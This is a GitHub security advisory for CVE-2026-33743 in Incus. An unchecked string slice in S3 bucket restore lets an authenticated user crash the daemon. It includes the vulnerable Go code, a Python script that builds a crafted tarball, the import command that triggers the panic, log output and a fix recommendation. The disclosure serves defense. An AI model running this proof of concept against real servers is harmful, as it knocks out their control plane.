# [M] Incus vulnerable to denial of source through crafted bucket backup file

## Summary
Severity: Medium
Advisory: GHSA-vg76-xmhg-j5x3
CVE: CVE-2026-33743
CWE: CWE-770
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-03-27
Source: https://github.com/advisories/GHSA-vg76-xmhg-j5x3
Type: github-advisory

## Affected
- Go: `github.com/lxc/incus/v6` — affected >=0 <6.23.0
- Go: `github.com/lxc/incus` — affected >=0

## Details
### Summary
A specially crafted storage bucket backup can be used by an user with access to Incus' storage bucket feature to crash the Incus daemon. Repeated use of this attack can be used to keep the server offline causing a denial of service of the control plane API.

This does not impact any running workload, existing containers and virtual machines will keep operating.

### Details

The S3 transfer manager contains an unchecked string slicing vulnerability that allows an authenticated attacker to crash the daemon during S3 restore operations. While processing tar headers from a supplied backup archive, the code skips only the index entry and strips the expected bucket prefix from all other entries without first validating the header name.

In Go, slicing a string with a starting index beyond the string length triggers a runtime panic. Because no prefix or length validation is performed before this operation, a malicious archive containing a non-index entry with a shorter-than-expected header name can trigger a slice-bounds panic and terminate the daemon. This results in immediate denial of service on the node.

Affected File:
https://github.com/lxc/incus/blob/v6.20.0/internal/server/storage/s3/transfer_manager.go 

Affected Code:
```
func (t TransferManager) UploadAllFiles(bucketName string, srcData io.ReadSeeker) error {
    [...]
    for {
        hdr, err := tr.Next()
        if err == io.EOF {
            break // End of archive.
        }

        // Skip index.yaml file
        if hdr.Name == "backup/index.yaml" {
            continue
        }

        // Skip directories because they are part of the key of an actual file
        fileName := hdr.Name[len("backup/bucket/"):]

        _, err = minioClient.PutObject(ctx, bucketName, fileName, tr, -1, minio.PutObjectOptions{})
        if err != nil {
            return err
        }
    }

    return nil
}
```

### PoC

The following PoC demonstrates that a malformed backup archive containing a non-index tar entry with a shorter-than-expected name can trigger a slice-bounds panic in the S3 restore path and terminate the incusd daemon.

Step 1: Enable the storage buckets listener

On the Incus host, enable the storage buckets listener so that the S3 transfer path can initialize correctly during import.

Command:
```
incus config set core.storage_buckets_address :4443
```

Step 2: Create the malicious archive

From a client or workstation with Python available, create a crafted backup archive that contains a valid backup/index.yaml entry followed by a second entry whose name is shorter than the expected backup/bucket/ prefix length.

Commands:
```
cat <<EOF > poc_s3_slicing.py
import tarfile
import io
import yaml

index_data = {
    "name": "s3-slice-panic",
    "config": {
        "bucket": {
            "description": "Bypassing metadata checks",
            "config": {}
        },
        "bucket_keys": [
            {
                "name": "poc-key",
                "role": "admin",
                "description": "Bypassing key lookup",
                "access-key": "AAAAAAAAAAAAAAAAAAAA",
                "secret-key": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
            }
        ]
    }
}

malicious_file = "backup/x"

with tarfile.open("s3_panic.tar.gz", "w:gz") as tar:
    content = yaml.dump(index_data).encode("utf-8")
    idx_info = tarfile.TarInfo(name="backup/index.yaml")
    idx_info.size = len(content)
    tar.addfile(idx_info, io.BytesIO(content))

    panic_content = b"trigger_s3_panic"
    p_info = tarfile.TarInfo(name=malicious_file)
    p_info.size = len(panic_content)
    tar.addfile(p_info, io.BytesIO(panic_content))

print("[+] PoC Tarball Created: s3_panic.tar.gz")
EOF
```

python3 poc_s3_slicing.py

Result:
```
[+] PoC Tarball Created: s3_panic.tar.gz
```

Step 3: Trigger the vulnerable import path

From an Incus client with permission to import storage buckets, import the crafted archive into any valid storage pool.

Command:
```
incus storage bucket import local-pool s3_panic.tar.gz panic-test
```

Result:
```
Error: Operation not found
```

Step 4: Verify the daemon panic

On the Incus host, inspect the service logs and confirm that the daemon terminated with a slice-bounds panic in TransferManager.UploadAllFiles.

Command:
```
journalctl -u incus -n 50 | grep -A 15 "panic"
```

Result:
```
panic: runtime error: slice bounds out of range [14:8]
goroutine [running]:
github.com/lxc/incus/v6/internal/server/storage/s3.TransferManager.UploadAllFiles(...)
/home/stgraber/Code/lxc/incus/internal/server/storage/s3/transfer_manager.go:139
```

It is recommended to validate that the header name begins with the expected bucket prefix and is at least as long as that prefix before slicing the string. If the entry does not match the expected archive format, the function should return a normal validation error and abort processing safely rather than allowing a runtime panic.

### Credit
This issue was discovered and reported by the team at [7asecurity](https://7asecurity.com/)

## References
- https://github.com/lxc/incus/security/advisories/GHSA-vg76-xmhg-j5x3
- https://nvd.nist.gov/vuln/detail/CVE-2026-33743
- https://github.com/lxc/incus/commit/4bca6332e8227a5f25f74b51a66b7382e9133aaa
- https://github.com/lxc/incus
- https://github.com/lxc/incus/releases/tag/v6.23.0
